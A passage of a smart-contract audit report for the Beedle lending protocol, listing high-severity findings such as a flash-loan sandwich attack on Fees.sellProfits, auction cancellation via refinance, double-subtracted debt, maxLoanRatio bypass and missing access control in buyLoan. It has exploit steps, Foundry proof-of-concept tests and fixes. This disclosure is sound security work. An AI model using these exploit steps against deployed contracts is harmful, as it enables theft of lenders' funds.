## Tools Used
Manual review + Foundry

## Recommendations
Follow the _Checks - Effect - Interactions_ (CEI) pattern by updating the pools mapping (Line 175) before transfering the funds AND use nonReentrant modifiers
## <a id='H-04'></a>H-04. Sandwich attack to steal all ERC-20 tokens in the Fees contract

_Submitted by [pyro](https://profiles.cyfrin.io/u/undefined), [rhaosec](https://profiles.cyfrin.io/u/undefined), [n1punp](https://profiles.cyfrin.io/u/undefined), [kutu](https://profiles.cyfrin.io/u/undefined), [daciantemp](https://profiles.cyfrin.io/u/undefined), [mahdirostami](https://profiles.cyfrin.io/u/undefined), [Rotcivegaf](https://profiles.cyfrin.io/u/undefined), [HChang26](https://profiles.cyfrin.io/u/undefined), [0xbepresent](https://profiles.cyfrin.io/u/undefined), [polaris_tow](https://profiles.cyfrin.io/u/undefined), [GoSoul22](https://profiles.cyfrin.io/u/undefined), [Bughunter101](https://profiles.cyfrin.io/u/undefined), [Martin](https://profiles.cyfrin.io/u/undefined), [qckhp](https://profiles.cyfrin.io/u/undefined), [fakemonkgin](https://profiles.cyfrin.io/u/undefined), [jprod15](https://profiles.cyfrin.io/u/undefined), [1d9f10834c](https://profiles.cyfrin.io/u/undefined), [ZdravkoHr](https://profiles.cyfrin.io/u/undefined), [jigster](https://profiles.cyfrin.io/u/undefined), [credence0x](https://profiles.cyfrin.io/u/undefined), [leasowillow](https://profiles.cyfrin.io/u/undefined), [rvierdiiev](https://profiles.cyfrin.io/u/undefined), [Vagner](https://profiles.cyfrin.io/u/undefined), [degensec](https://profiles.cyfrin.io/u/undefined), [castleChain](https://profiles.cyfrin.io/u/undefined), [Phantasmagoria](https://profiles.cyfrin.io/u/undefined), [0xumarkhatab](https://profiles.cyfrin.io/u/undefined), [0xanmol](https://profiles.cyfrin.io/u/undefined), [bauchibred](https://profiles.cyfrin.io/u/undefined), [aviggiano](https://profiles.cyfrin.io/u/undefined), [0x9527](https://profiles.cyfrin.io/u/undefined), [0xAsen](https://profiles.cyfrin.io/u/undefined), [lalanda](https://profiles.cyfrin.io/u/undefined), [RugpullDetector](https://profiles.cyfrin.io/u/undefined), [jnrlouis](https://profiles.cyfrin.io/u/undefined), [daniel526](https://profiles.cyfrin.io/u/undefined), [qbs](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [Bobface](https://profiles.cyfrin.io/u/undefined), [Harut](https://profiles.cyfrin.io/u/undefined), [StErMi](https://profiles.cyfrin.io/u/undefined), [darksnow](https://profiles.cyfrin.io/u/undefined), [dimulski](https://profiles.cyfrin.io/u/undefined), [abarbatei](https://profiles.cyfrin.io/u/undefined), [0xanjan143](https://profiles.cyfrin.io/u/undefined), [toshii](https://profiles.cyfrin.io/u/undefined), [twcctop](https://profiles.cyfrin.io/u/undefined), [niluke](https://profiles.cyfrin.io/u/undefined), [Shogoki](https://profiles.cyfrin.io/u/undefined), [auditsea](https://profiles.cyfrin.io/u/undefined), [auditism](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [ravikiranweb3](https://profiles.cyfrin.io/u/undefined), [alliums0517](https://profiles.cyfrin.io/u/undefined), [0xJuda](https://profiles.cyfrin.io/u/undefined), [kral01](https://profiles.cyfrin.io/u/undefined), [0xrststn](https://profiles.cyfrin.io/u/undefined), [y51r](https://profiles.cyfrin.io/u/undefined), [peanuts](https://profiles.cyfrin.io/u/undefined), [nervouspika](https://profiles.cyfrin.io/u/undefined), [Arabadzhiev](https://profiles.cyfrin.io/u/undefined), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj), [JohnnyTime](https://profiles.cyfrin.io/u/undefined), [vangrim](https://profiles.cyfrin.io/u/undefined), [trtrth](https://profiles.cyfrin.io/u/undefined), [0xgrbr](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [jonatascm](https://profiles.cyfrin.io/u/undefined), [0xCiphky](https://profiles.cyfrin.io/u/undefined), [33audits](https://profiles.cyfrin.io/u/undefined), [Juntao](https://profiles.cyfrin.io/u/undefined), [pks271](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [LaScaloneta](https://codehawks.cyfrin.io/team/clkgxjy6h0025lc080s97ux79), [Drikkx](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [pengun](https://profiles.cyfrin.io/u/undefined), [stoicov](https://profiles.cyfrin.io/u/undefined), [zuhaibmohd](https://profiles.cyfrin.io/u/undefined), [bloqarl](https://profiles.cyfrin.io/u/undefined), [0xdice91](https://profiles.cyfrin.io/u/undefined), [iurii2002](https://profiles.cyfrin.io/u/undefined), [Bauer](https://profiles.cyfrin.io/u/undefined), [kupiasec](https://profiles.cyfrin.io/u/undefined), [Madalad](https://profiles.cyfrin.io/u/undefined), [0xyPhilic](https://profiles.cyfrin.io/u/undefined), [arnie](https://profiles.cyfrin.io/u/undefined), [B353N](https://profiles.cyfrin.io/u/undefined), [Avci](https://profiles.cyfrin.io/u/undefined), [8olidity](https://profiles.cyfrin.io/u/undefined), [0xcm](https://profiles.cyfrin.io/u/undefined), [CircleLooper](https://profiles.cyfrin.io/u/undefined), [tsvetanovv](https://profiles.cyfrin.io/u/undefined), [0xsmartcontract](https://profiles.cyfrin.io/u/undefined), [Tatakae](https://codehawks.cyfrin.io/team/clkpe7ipx0001kz08k8k1pp3v), [flacko](https://profiles.cyfrin.io/u/undefined), [0xdeth](https://profiles.cyfrin.io/u/undefined), [alexzoid](https://profiles.cyfrin.io/u/undefined), [PTolev](https://profiles.cyfrin.io/u/undefined), [0xmuxyz](https://profiles.cyfrin.io/u/undefined), [0xDanielH](https://profiles.cyfrin.io/u/undefined), [ni8mare](https://profiles.cyfrin.io/u/undefined), [mitko1111](https://profiles.cyfrin.io/u/undefined), [pina](https://profiles.cyfrin.io/u/undefined), [smbv1923](https://profiles.cyfrin.io/u/undefined), [HarisNabeel13](https://profiles.cyfrin.io/u/undefined), [patrooney](https://profiles.cyfrin.io/u/undefined), [EchoSpr](https://profiles.cyfrin.io/u/undefined), [breeje](https://profiles.cyfrin.io/u/undefined), [gkrastenov](https://profiles.cyfrin.io/u/undefined), [ohi0b](https://profiles.cyfrin.io/u/undefined), [aak](https://profiles.cyfrin.io/u/undefined), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro), [dethera](https://profiles.cyfrin.io/u/undefined), [trachev](https://profiles.cyfrin.io/u/undefined), [kose](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined), [chainnue](https://profiles.cyfrin.io/u/undefined), [UrosZigic](https://profiles.cyfrin.io/u/undefined), [Deivitto](https://profiles.cyfrin.io/u/undefined), [dipp](https://profiles.cyfrin.io/u/undefined), [hlx](https://profiles.cyfrin.io/u/undefined), [JMTT](https://profiles.cyfrin.io/u/undefined), [turvec](https://profiles.cyfrin.io/u/undefined), [offkey](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [0xaadhi](https://profiles.cyfrin.io/u/undefined), [ak1](https://profiles.cyfrin.io/u/undefined), [Crunch](https://profiles.cyfrin.io/u/undefined), [funderbrkrer](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [serialcoder](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L38-L39

## Summary

The `Fees::sellProfits()` lacks slippage protection, resulting in being attacked by a sandwich attack to drain all locked ERC-20 tokens.

## Vulnerability Details

The `sellProfits()` is a permissionless function that can be called by anyone. The function lacks [slippage protection](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L38-L39) (the parameters `amountOutMinimum` and `sqrtPriceLimitX96` are set to 0) when swapping tokens through Uniswap's pools. 

In this way, an attacker can launch a sandwich attack with a flash loan to drain all ERC-20 tokens (e.g., USDC, DAI, CRV, etc.) locked in the `Fees` contract. 

For instance, to drain all USDC, consider the following proof-of-concept.
1. Attacker borrows a flash loan for USDC and buys WETH from Uniswap's WETH/USDC pool.
2. Attacker executes the `sellProfits(USDC)`.
3. The `sellProfits()` will spend all locked USDC for buying WETH at a very high price.
4. Attacker sells the previously obtained WETH for USDC at the same pool and repays the flash loan.
5. Attacker takes all locked USDC as profit.

Moreover, an attacker can perform steps 1-5 above to steal other ERC-20 tokens locked in the `Fees` contract.

```solidity
    function sellProfits(address _profits) public {
        require(_profits != WETH, "not allowed");
        uint256 amount = IERC20(_profits).balanceOf(address(this));

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
@>              amountOutMinimum: 0,
@>              sqrtPriceLimitX96: 0
            });

        amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
    }
```

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L38-L39

## Impact

An attacker can drain all ERC-20 tokens (e.g., USDC, DAI, CRV, etc.) locked in the `Fees` contract. Therefore, I consider this vulnerability a high-risk issue.

## Tools Used

Manual Review

## Recommendations

I recommend adding the `onlyOwner` modifier and setting the `amountOutMinimum` parameter to protect price slippage from MEV bots. If necessary, specify the `sqrtPriceLimitX96` parameter to set a stop price.
## <a id='H-05'></a>H-05. Borrower can use Refinance to cancel auctions so they can extend their loan indefinitely

_Submitted by [0xbepresent](https://profiles.cyfrin.io/u/undefined), [Bughunter101](https://profiles.cyfrin.io/u/undefined), [rvierdiiev](https://profiles.cyfrin.io/u/undefined), [pyro](https://profiles.cyfrin.io/u/undefined), [1d9f10834c](https://profiles.cyfrin.io/u/undefined), [cosine](https://profiles.cyfrin.io/u/undefined), [daciantemp](https://profiles.cyfrin.io/u/undefined), [trtrth](https://profiles.cyfrin.io/u/undefined), [0xAliX2](https://codehawks.cyfrin.io/team/clkjw3gca000dl708tf0bowdx), [abarbatei](https://profiles.cyfrin.io/u/undefined), [pks271](https://profiles.cyfrin.io/u/undefined), [Bauer](https://profiles.cyfrin.io/u/undefined), [BanditSecurity](https://profiles.cyfrin.io/u/undefined), [qckhp](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [lalanda](https://profiles.cyfrin.io/u/undefined), [Aamir](https://profiles.cyfrin.io/u/undefined), [0xbugalba](https://codehawks.cyfrin.io/team/clkff1bat0001k4082yo3xy8j), [Mlome](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined), [dimulski](https://profiles.cyfrin.io/u/undefined), [trachev](https://profiles.cyfrin.io/u/undefined). Selected submission by: [BanditSecurity](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L591

## Summary

When the lender auctions their loan, the borrower can call refinance() into a pool which has exactly the same specifications as the previous pool, and then immediately giveLoan() or refinance back into the original pool. This cancels the auction and allows the borrower to extend their loan indefinitely even if it is insolvent. 

## Vulnerability Details

Here is a POC that Refinance resets loan time. The auction is initiated through:

`lender.startAuction(loanIds);`

So the auction should end 1 day from the current block.timestamp. Then it is refinanced.

If refinance resets the auction timestamp, startAuctionTimestamp will be reset to type(uint256).max:

`assertEq(auctionTimestamp, type(uint256).max);`

This test passes so the proof/attack was successful


```solidity
    function test_refinance_during_auction() public {
        test_borrow();

        vm.startPrank(lender2);
        Pool memory p = Pool({
            lender: lender2,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100*10**18,
            poolBalance: 1000*10**18,
            maxLoanRatio: 2*10**18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        lender.setPool(p);

        vm.startPrank(lender1);

        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;

        //start auction is called
        lender.startAuction(loanIds);


        vm.startPrank(borrower);
        Refinance memory r = Refinance({
            loanId: 0,
            poolId: keccak256(
                abi.encode(
                    address(lender2),
                    address(loanToken),
                    address(collateralToken)
                )
            ),
            debt: 100*10**18,
            collateral: 100*10**18
        });
        Refinance[] memory rs = new Refinance[](1);
        rs[0] = r;

        lender.refinance(rs);

        (,,,,,,,,uint auctionTimestamp,) = lender.loans(0);

        //assert that auction timestamp has reset
        assertEq(auctionTimestamp, type(uint256).max);

        
    }
```

## Impact

Borrower can extend their loan forever without being seized

## Tools Used

Foundry

## Recommendations

Do not reset the auctions starting time when refinance is called.
## <a id='H-06'></a>H-06. During refinance() new Pool balance debt is subtracted twice

_Submitted by [pyro](https://profiles.cyfrin.io/u/undefined), [GoSoul22](https://profiles.cyfrin.io/u/undefined), [daciantemp](https://profiles.cyfrin.io/u/undefined), [kutu](https://profiles.cyfrin.io/u/undefined), [0xAliX2](https://codehawks.cyfrin.io/team/clkjw3gca000dl708tf0bowdx), [0xbepresent](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [rvierdiiev](https://profiles.cyfrin.io/u/undefined), [StErMi](https://profiles.cyfrin.io/u/undefined), [qckhp](https://profiles.cyfrin.io/u/undefined), [cosine](https://profiles.cyfrin.io/u/undefined), [trtrth](https://profiles.cyfrin.io/u/undefined), [lealCodes](https://profiles.cyfrin.io/u/undefined), [pacelli](https://profiles.cyfrin.io/u/undefined), [toshii](https://profiles.cyfrin.io/u/undefined), [0xdeth](https://profiles.cyfrin.io/u/undefined), [tiesstevelink](https://profiles.cyfrin.io/u/undefined), [0xCiphky](https://profiles.cyfrin.io/u/undefined), [khegeman](https://profiles.cyfrin.io/u/undefined), [Juntao](https://profiles.cyfrin.io/u/undefined), [0xlemon](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [amar](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [CircleLooper](https://profiles.cyfrin.io/u/undefined), [pengun](https://profiles.cyfrin.io/u/undefined), [B353N](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [0xDetermination](https://profiles.cyfrin.io/u/undefined), [kupiasec](https://profiles.cyfrin.io/u/undefined), [abarbatei](https://profiles.cyfrin.io/u/undefined), [Mukund](https://profiles.cyfrin.io/u/undefined), [Cryptic Snake REACH](https://codehawks.cyfrin.io/team/clkl8yzo70009mn08l4myjpwk), [0x11singh99](https://profiles.cyfrin.io/u/undefined), [Tatakae](https://codehawks.cyfrin.io/team/clkpe7ipx0001kz08k8k1pp3v), [0xDanielH](https://profiles.cyfrin.io/u/undefined), [Saskloch](https://profiles.cyfrin.io/u/undefined), [lalanda](https://profiles.cyfrin.io/u/undefined), [JrNet](https://profiles.cyfrin.io/u/undefined), [Aamir](https://profiles.cyfrin.io/u/undefined), [Niki](https://profiles.cyfrin.io/u/undefined), [Mlome](https://profiles.cyfrin.io/u/undefined), [ohi0b](https://profiles.cyfrin.io/u/undefined), [HALITUS](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined), [kose](https://profiles.cyfrin.io/u/undefined), [trachev](https://profiles.cyfrin.io/u/undefined), [JMTT](https://profiles.cyfrin.io/u/undefined), [offkey](https://profiles.cyfrin.io/u/undefined), [Crunch](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Cryptic Snake REACH](https://codehawks.cyfrin.io/team/clkl8yzo70009mn08l4myjpwk)._      
            
### Relevant GitHub Links

https://github.com/Marzel7/Beedle/blob/main/test/POC/Refinance.t.sol



## Summary

A borrower has the opportunity to move their loan to another pool under new lending conditions.

During refinancing interest from the loan is transferred to the old pool.

The debt is then transferred to the new pool however this subraction occurs twice, resulting in loss of funds to the Lenders pool.



## Vulnerability Details

In refinance() the debt to the new pool is transferred at line 636


```solidity

_updatePoolBalance(poolId, pools[poolId].poolBalance - debt);

```

The debt is subtracted again at line 696

```solidity

pools[poolId].poolBalance -= debt;

```

##  Impact


Pool balances are reduced twice by the transferred debt. The larger the loan the greater the loss of funds to the new pool.


## Code Snippet

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L636

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L698


## Proof of Concept

```solidity

  function test_Refinance() public {
        vm.startPrank(lender1);
        Pool memory p1 = Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: POOL_LOAN_TOKEN_BALANCE,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });

        Pool memory p2 = Pool({
            lender: lender2,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: POOL_B_LOAN_TOKEN_BALANCE,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });

        bytes32 poolIdOne = lender.setPool(p1);

        vm.startPrank(lender2);
        bytes32 poolIdTwo = lender.setPool(p2);

        bytes32[] memory poolIds = new bytes32[](3);
        poolIds[0] = poolIdOne;
        poolIds[1] = poolIdTwo;

        uint256[] memory loansIds = new uint256[](1);
        loansIds[0] = 0;

        vm.startPrank(borrower);
        Borrow memory b = Borrow({poolId: poolIdOne, debt: LOAN_AMOUNT, collateral: 1000 * 10 ** 18});
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;
        lender.borrow(borrows);

        Refinance memory r =
            Refinance({loanId: 0, poolId: poolIdTwo, debt: 1000 * 10 ** 18, collateral: 1000 * 10 ** 18});
        Refinance[] memory refinances = new Refinance[](1);
        refinances[0] = r;

        vm.warp(10 days);

        // New Pool balance before refinancing
        (,,,, uint256 poolBalance,,,,) = lender.pools(poolIdTwo);
        assertEq(poolBalance, (POOL_B_LOAN_TOKEN_BALANCE));

        lender.refinance(refinances);

        (,,,, poolBalance,,,,) = lender.pools(poolIdTwo);
        // Debt is transferred to new pool twice
        assertEq(poolBalance, (POOL_B_LOAN_TOKEN_BALANCE) - (2 * 1000 * 10 ** 18));

  }

```

## Tools Used

Manual review and Foundry for the POC

## Recommended Mitigation Steps

Remove the second debt transfer at line 696

```solidity

pools[poolId].poolBalance -= debt;

```





## <a id='H-07'></a>H-07. Borrower can bypass maxLoanRatio's configuration of a pool via buyLoan()

_Submitted by [kutu](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [leasowillow](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [jnrlouis](https://profiles.cyfrin.io/u/undefined), [Tatakae](https://codehawks.cyfrin.io/team/clkpe7ipx0001kz08k8k1pp3v), [bernd](https://profiles.cyfrin.io/u/undefined), [0xsandy](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [sonny2k](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
In [buyLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465), there is no validation if the `loanRation < pool.maxLoanRatio`. Therefore, a lender can be given a loan with higher LTV than his pool which he doesn't want at all.

## Vulnerability Details
Since [buyLoan()](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465) can be called by anyone, a malicious borrower can borrow a loan from his own pool with a pretty high `maxLoanRatio` so that he can put the least collateral possible to take the loan, then forcefully push this loan by calling `buyLoan()` with his own loan to a random pool with enough pool balance of the pairs. Doing this helps the borrower avoid the risk of high LTV.

## POC
1. We mint the `loanToken` to `borrower` so that he can set up his pool in [setUp()](https://github.com/Cyfrin/2023-07-beedle/blob/main/test/Lender.t.sol#L35) function of `Lender.t.sol`
```diff
+        loanToken.mint(address(borrower), 100000 * 10 ** 18);
```
2. Paste this code into `Lender.t.sol`: https://github.com/Cyfrin/2023-07-beedle/blob/main/test/Lender.t.sol.
Right here the borrower set up his pool with very high `maxLoanRatio` of 5 and borrow the loan himself/herself.
```
function test_borrowPoc() public {
        vm.startPrank(borrower);
        Pool memory p = Pool({
            lender: borrower,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: 1000 * 10 ** 18,
            maxLoanRatio: 5 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(p);

        (, , , , uint256 poolBalance, , , , ) = lender.pools(poolId);
        assertEq(poolBalance, 1000 * 10 ** 18);

        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 100 * 10 ** 18,
            collateral: 100 * 10 ** 18
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;
        lender.borrow(borrows);

        assertEq(collateralToken.balanceOf(address(lender)), 100 * 10 ** 18);
        (, , , , poolBalance, , , , ) = lender.pools(poolId);
        assertEq(poolBalance, 900 * 10 ** 18);
}
```
3. Paste this code into `Lender.t.sol`: https://github.com/Cyfrin/2023-07-beedle/blob/main/test/Lender.t.sol.
Right here the `borrower` starts the auction for his loan and call `buyLoan()` with the pool of `lender1`, which only has the `maxLoanRatio` value of 1. The test goes through successfully, meaning the loan is bought to the new pool and the `borrower` can now enjoy his high LTV loan being managed by the new pool (`lender1`)
```
function test_bypassMaxLoanRatio() public {
        test_borrowPoc();
        // accrue interest
        vm.warp(block.timestamp + 1 days);
        // kick off auction
        vm.startPrank(borrower);

        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;

        lender.startAuction(loanIds);

        vm.startPrank(lender1);
        Pool memory p = Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: 1000 * 10 ** 18,
            maxLoanRatio: 1 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(p);

        // warp to middle of auction
        vm.warp(block.timestamp + 12 hours);

        vm.startPrank(borrower);

        lender.buyLoan(0, poolId);
}
```
Use `forge test --mt test_bypassMaxLoanRatio` to run this test case.

## Impact
1. Borrower can give his high LTV loan to any pool with enough balance by calling `buyLoan()` to escape the risk of high LTV.
2. Anyone or the new lender himself/herself can buy the loan via `buyLoan()` without noticing the high LTV in it, which may lead to fund losing.

## Tools Used
Manual

## Recommendations
Consider implement a validation for the loan ratio like other functions in the contract after line [485](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L485).
```diff
485      uint256 totalDebt = loan.debt + lenderInterest + protocolInterest;
+        uint256 loanRatio = (totalDebt * 10 ** 18) / loan.collateral;
+        if (loanRatio > pools[poolId].maxLoanRatio) revert RatioTooHigh();
```
## <a id='H-08'></a>H-08. [H-04] Lender#buyLoan - Malicious user could take over a loan for free without having a pool because of wrong access control

_Submitted by [daciantemp](https://profiles.cyfrin.io/u/undefined), [ElHaj](https://profiles.cyfrin.io/u/undefined), [0xl3xx](https://profiles.cyfrin.io/u/undefined), [lealCodes](https://profiles.cyfrin.io/u/undefined), [1d9f10834c](https://profiles.cyfrin.io/u/undefined), [kutu](https://profiles.cyfrin.io/u/undefined), [ptsanev](https://profiles.cyfrin.io/u/undefined), [0xbepresent](https://profiles.cyfrin.io/u/undefined), [credence0x](https://profiles.cyfrin.io/u/undefined), [rvierdiiev](https://profiles.cyfrin.io/u/undefined), [pyro](https://profiles.cyfrin.io/u/undefined), [StErMi](https://profiles.cyfrin.io/u/undefined), [0xAliX2](https://codehawks.cyfrin.io/team/clkjw3gca000dl708tf0bowdx), [0xdeth](https://profiles.cyfrin.io/u/undefined), [cosine](https://profiles.cyfrin.io/u/undefined), [jprod15](https://profiles.cyfrin.io/u/undefined), [trtrth](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [0xAsen](https://profiles.cyfrin.io/u/undefined), [B353N](https://profiles.cyfrin.io/u/undefined), [toshii](https://profiles.cyfrin.io/u/undefined), [0xhuy0512](https://profiles.cyfrin.io/u/undefined), [daniel526](https://profiles.cyfrin.io/u/undefined), [leasowillow](https://profiles.cyfrin.io/u/undefined), [amar](https://profiles.cyfrin.io/u/undefined), [kral01](https://profiles.cyfrin.io/u/undefined), [tiesstevelink](https://profiles.cyfrin.io/u/undefined), [0xCiphky](https://profiles.cyfrin.io/u/undefined), [0xepley](https://codehawks.cyfrin.io/team/clkjtgvih0001jt088aqegxjj), [Juntao](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [owade](https://profiles.cyfrin.io/u/undefined), [pep7siup](https://profiles.cyfrin.io/u/undefined), [jnrlouis](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [CircleLooper](https://profiles.cyfrin.io/u/undefined), [pengun](https://profiles.cyfrin.io/u/undefined), [qbs](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [Cryptic Snake REACH](https://codehawks.cyfrin.io/team/clkl8yzo70009mn08l4myjpwk), [vangrim](https://profiles.cyfrin.io/u/undefined), [BanditSecurity](https://profiles.cyfrin.io/u/undefined), [Mlome](https://profiles.cyfrin.io/u/undefined), [kupiasec](https://profiles.cyfrin.io/u/undefined), [jonatascm](https://profiles.cyfrin.io/u/undefined), [qckhp](https://profiles.cyfrin.io/u/undefined), [Mukund](https://profiles.cyfrin.io/u/undefined), [0xdice91](https://profiles.cyfrin.io/u/undefined), [0xDanielH](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [PTolev](https://profiles.cyfrin.io/u/undefined), [Tatakae](https://codehawks.cyfrin.io/team/clkpe7ipx0001kz08k8k1pp3v), [lalanda](https://profiles.cyfrin.io/u/undefined), [1nc0gn170](https://profiles.cyfrin.io/u/undefined), [Niki](https://profiles.cyfrin.io/u/undefined), [0x11singh99](https://profiles.cyfrin.io/u/undefined), [Aamir](https://profiles.cyfrin.io/u/undefined), [0xsandy](https://profiles.cyfrin.io/u/undefined), [0xlemon](https://profiles.cyfrin.io/u/undefined), [0xsilvermist](https://profiles.cyfrin.io/u/undefined), [aak](https://profiles.cyfrin.io/u/undefined), [serialcoder](https://profiles.cyfrin.io/u/undefined), [0xrochimaru](https://profiles.cyfrin.io/u/undefined), [dimulski](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [JMTT](https://profiles.cyfrin.io/u/undefined), [ADM](https://profiles.cyfrin.io/u/undefined), [Crunch](https://profiles.cyfrin.io/u/undefined). Selected submission by: [vangrim](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L518-L522

## **Summary**

The **`buyLoan`** function within the Lender contract displays a critical vulnerability due to improper access controls. This loophole can potentially allow a malicious actor to gain unauthorized control over a loan.

## **Vulnerability Details**

In the `buyLoan` function, we’re buying a loan that has gone to auction. A malicious user can send in the `loanId` to buy and a random `poolId` that passes the requirement checks in the function such as having an `interestRate` lower than the `currentAuctionRate` and that the pool is big enough.

The vulnerability exploit lies in these lines where we’re setting the `msg.sender` as the new lender.

```solidity
// update the loan with the new info
        loans[loanId].lender = msg.sender;
        loans[loanId].interestRate = pools[poolId].interestRate;
        loans[loanId].startTimestamp = block.timestamp;
        loans[loanId].auctionStartTimestamp = type(uint256).max;
        loans[loanId].debt = totalDebt
```

## **Impact**

A malicious user can exploit this oversight to gain unauthorized ownership of a loan despite not being the owner of the specified `poolId`. This not only compromises the security and trustworthiness of the lending protocol but can also lead to significant financial losses for legitimate users and lenders within the system.

## **Tools Used**

Manual Review.

## **Recommendations**

Implement an authorization check at the beginning of the **`buyLoan`** function. This should verify that the caller is the rightful owner of the specified **`poolId`.**

```solidity
if(msg.sender != pool.lender) revert Unauthorized();
```
## <a id='H-09'></a>H-09. Using forged/fake lending pools to steal any loan opening for auction

_Submitted by [ElHaj](https://profiles.cyfrin.io/u/undefined), [qbs](https://profiles.cyfrin.io/u/undefined), [Bughunter101](https://profiles.cyfrin.io/u/undefined), [nmirchev8](https://profiles.cyfrin.io/u/undefined), [0xAliX2](https://codehawks.cyfrin.io/team/clkjw3gca000dl708tf0bowdx), [lealCodes](https://profiles.cyfrin.io/u/undefined), [cosine](https://profiles.cyfrin.io/u/undefined), [0xbepresent](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [StErMi](https://profiles.cyfrin.io/u/undefined), [leasowillow](https://profiles.cyfrin.io/u/undefined), [xAlismx](https://profiles.cyfrin.io/u/undefined), [tiesstevelink](https://profiles.cyfrin.io/u/undefined), [owade](https://profiles.cyfrin.io/u/undefined), [pep7siup](https://profiles.cyfrin.io/u/undefined), [jnrlouis](https://profiles.cyfrin.io/u/undefined), [vangrim](https://profiles.cyfrin.io/u/undefined), [kupiasec](https://profiles.cyfrin.io/u/undefined), [0xDanielH](https://profiles.cyfrin.io/u/undefined), [qckhp](https://profiles.cyfrin.io/u/undefined), 